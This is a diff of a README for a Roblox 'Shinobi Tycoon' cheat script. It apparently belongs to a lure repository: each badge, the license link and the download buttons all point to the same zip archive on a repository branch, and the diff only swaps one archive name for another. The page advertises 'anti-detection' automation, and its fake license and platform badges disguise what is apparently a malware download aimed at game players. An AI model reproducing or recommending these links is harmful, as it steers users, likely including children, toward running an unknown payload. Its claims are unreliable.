@@ -1,8 +1,8 @@
 # 🌌 Shinobi Tycoon Roblox Script
 
-[![Stars](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)]()  
-[![Forks](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)]()  
-[![MIT License](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)
+[![Stars](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)]()  
+[![Forks](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)]()  
+[![MIT License](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)
 
 Welcome to the home of the **Shinobi Tycoon Roblox Script**, an advanced, imaginative powerhouse that brings the Narutoverse right into your gameplay. Unleash enhanced experiences, strategic automation, and a touch of AI-fueled mastery, designed for those who want to transform their play into an art form. Whether you’re a casual aficionado or seasoned shinobi, this script unlocks dynamic potential in every session.
 
@@ -11,12 +11,12 @@ Welcome to the home of the **Shinobi Tycoon Roblox Script**, an advanced, imagin
 
 |      System       |      Supported      | Badge                                                            |
 |:-----------------:|:------------------:|:---------------------------------------------------------------:|
-|   Windows 10/11   |         ✅         | ![Windows](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip%2F11-blue)   |
-|      macOS        |         ✅         | ![macOS](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)    |
-|     Linux         |         ✅         | ![Linux](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)    |
-|    Mobile (iOS)   |         🔄         | ![iOS](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip%20support-orange)|
-| Android Tablets   |         🔄         | ![Android](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)  |
-| Roblox Studio     |         ✅         | ![Roblox](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)     |
+|   Windows 10/11   |         ✅         | ![Windows](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip%2F11-blue)   |
+|      macOS        |         ✅         | ![macOS](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)    |
+|     Linux         |         ✅         | ![Linux](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)    |
+|    Mobile (iOS)   |         🔄         | ![iOS](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip%20support-orange)|
+| Android Tablets   |         🔄         | ![Android](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)  |
+| Roblox Studio     |         ✅         | ![Roblox](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)     |
 
 **Note:** For optimal shinobi experience, desktop platforms are recommended.
 
@@ -75,8 +75,8 @@ Enjoy smooth, secure gameplay with built-in anti-detection tools and best-in-cla
 **Installation Steps:**
 1. Download the latest `Shinobi Tycoon Roblox Script` package from the *Secure Shinobi Portal*:  
    
-   [![Download](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)  
-   https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip  
+   [![Download](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)  
+   https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip  
 
 2. Extract the compressed contents to your preferred directory.
 3. Open your project in Roblox Studio.
@@ -86,7 +86,7 @@ Enjoy smooth, secure gameplay with built-in anti-detection tools and best-in-cla
 7. Choose your preferred language and set your alerts preferences.
 
 **For ongoing upgrades:**  
-Check the mid-year content drops and special event scripts found at https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip
+Check the mid-year content drops and special event scripts found at https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip
 
 ---
 ## 💡 Usage & Gameplay Pro Tips
@@ -109,15 +109,15 @@ This repository is a **fan-driven automation utility for Shinobi Tycoon** enthus
 This project is proudly open-source and available under the MIT License (2025).
 
 Find the full license text here:  
-[MIT License](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)
+[MIT License](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)
 
 ---
 
 ## 🔁 Download & Next Steps
 
 Ready to master your ninja fate?  
-[![Download](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip)  
-https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi-tycoon-roblox-toolkit-v2.8.zip  
+[![Download](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)](https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip)  
+https://raw.githubusercontent.com/Lorenzodruif/shinobi-tycoon-roblox-toolkit/branch/manneristic/shinobi_tycoon_toolkit_roblox_2.0.zip  
 
 Stay tuned for fresh updates, seasonal scripts, and toolbox modules via our changelog!  
 *May your shadows be swift and your tycoon legendary.*
